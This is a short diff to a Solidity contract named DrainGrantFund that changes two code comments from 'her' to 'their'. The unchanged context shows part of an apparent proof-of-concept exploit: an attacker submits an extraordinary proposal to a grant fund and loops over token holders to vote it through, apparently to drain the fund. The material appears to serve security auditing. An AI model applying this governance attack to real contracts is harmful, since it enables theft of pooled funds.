@@ -29,10 +29,10 @@ contract DrainGrantFund {
 
         string memory description = "Extraordinary Proposal by attacker";
 
-        // attacker creates and submits her proposal
+        // attacker creates and submits their proposal
         uint256 proposalId = grantFund.proposeExtraordinary(endBlock, targets, values, calldatas, description);
 
-        // attacker is going to make every token holder vote in favor of her proposal
+        // attacker is going to make every token holder vote in favor of their proposal
         for (uint i = 0; i < tokenHolders.length; i++) {
             grantFund.voteExtraordinary(proposalId);
         }
